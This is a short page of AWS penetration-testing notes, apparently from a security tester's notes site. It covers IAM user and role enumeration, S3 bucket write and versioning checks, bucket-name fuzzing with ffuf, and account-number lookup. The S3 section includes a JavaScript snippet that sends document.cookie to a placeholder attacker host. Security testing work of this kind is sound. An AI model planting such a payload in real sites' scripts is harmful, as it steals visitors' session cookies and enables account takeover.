---
title: AWS Notes 
weight: 40
menu:
  notes:
    name: AWS Notes
    identifier: notes-cloud-aws-info
    parent: notes-cloud-aws
    weight: 20
---


{{< note title="IAM">}}

Enumerate for valid users and rols in the AWS Account 
- Tool URL: https://github.com/dievus/AWeSomeUserFinder
- Helpful Wordlists for Users and Roles
  - https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_users/default-word-list.txt
  - https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__enum_roles/default-word-list.txt


{{< /note >}}


<!-- Condition -->
{{< note title="S3 Buckets">}}

Check for Writable S3 Buckets
- If you can upload, then you can show impact by changing JS to steal cookies and other things.
  ```
  var xhr=new XMLHttpRequest();
  xhr.open("GET", "http://<IP>:8000/?"+document.cookie, true);
  xhr.send();
  ```

Check for Bucket Versioning
```
curl -I https://<BUCKETNAME>.s3.<REGION>.amazonaws.com //Look for x-amz-version-id
aws s3api list-object-versions --bucket <BUCKETNAME> --query "Versions[?VersionId!='null']" --no-sign-request
```


Brute Force Bucket Names (assuming patterns are found)
```
ffuf -u 'https://bucket-FUZZ.s3.amazonaws.com' -w fuzzingBucketWordlist.txt
```
{{< /note >}}

{{< note title="Odds and ends that sometimes help">}}
Check for AWS Account Number 
```
aws sts get-access-key-info --access-key <AKIA Key>
```

{{< /note >}}
